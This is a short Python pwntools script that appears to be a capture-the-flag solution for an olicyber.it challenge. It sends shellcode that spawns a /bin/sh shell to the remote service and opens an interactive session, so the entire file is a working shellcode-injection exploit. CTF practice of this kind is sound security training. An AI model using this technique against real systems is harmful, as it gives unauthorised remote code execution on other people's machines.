#!/usr/bin/env python3
from pwn import *

def main():
    context.log_level = 'debug'
    HOST = "software-20.challs.olicyber.it"
    PORT = 13003
    r = remote(HOST, PORT)
    
    # Generate shellcode that spawns a /bin/sh shell
    asm_code = shellcraft.amd64.linux.sh()
    shellcode = asm(asm_code, arch='x86_64')
    
    r.recv()
    r.sendline(b'n')

    # Send the shellcode length
    r.recv()
    r.sendline(f'{len(shellcode)}'.encode())
    
    # 
    r.recv().decode() 
    r.sendline(shellcode)
    
    r.interactive()
    
    r.close()

if __name__ == "__main__":
    main()